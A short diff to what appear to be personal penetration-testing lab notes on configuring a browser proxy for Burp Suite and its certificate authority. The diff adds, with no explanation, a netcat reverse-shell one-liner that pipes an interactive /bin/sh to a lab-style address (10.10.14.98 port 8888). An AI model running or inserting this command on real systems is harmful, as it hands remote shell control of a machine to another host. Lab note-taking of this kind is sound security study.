@@ -17,7 +17,7 @@ Select manual proxy configuration:
 	HTTP proxy: 127.0.0.1 8080
 	uncheck: Also use this proxy for FTP and HTTPS 
 	delete: ANYTHING in the "No proxy for" field
-
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 8888 >/tmp/f
 ## Burp Suite CA
 To intercept and analyze HTTPS traffic, BS has Certificate Authority and uses it to issue on-th-fly certifactes for each website that we visit and pass through Burp.
 
